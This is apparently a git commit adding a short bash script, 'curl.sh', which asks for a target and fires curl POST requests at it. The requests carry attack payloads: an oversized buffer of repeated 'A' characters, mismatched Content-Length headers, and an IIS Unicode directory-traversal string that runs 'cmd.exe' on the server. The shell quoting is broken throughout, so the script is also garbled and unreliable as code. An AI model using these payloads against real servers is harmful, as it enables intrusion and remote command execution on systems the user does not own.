bc3d8cdcecd50fa547de3361c3ad2013f57cea2f
Haroon Awan <39236904+haroonawanofficial@users.noreply.github.com>
2019-11-04 16:41:30 +0500

    Create curl.sh

---
+++ curl.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+echo -e "[ + ] Enter Target
+read Target
+
+curl -X POST -d ' / HTTP/1.1
+Host: google.com
+Connection: Keep-Alive
+Content-Length: 49225 
+perl -e 'print (A x 49255)
+-i '$Target'
+
+
+curl -X POST -d ' / HTTP/1.1
+Host: google.com
+Connection: Keep-Alive
+Content-Length: 33
+-i '$Target'
+
+
+curl -X POST -d ' / HTTP/1.1
+xxxx: POST /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.1
+-i '$Target'
+
+curl -X POST -d ' / HTTP/1.1
+Connection: Keep-Alive
+-i '$Target'
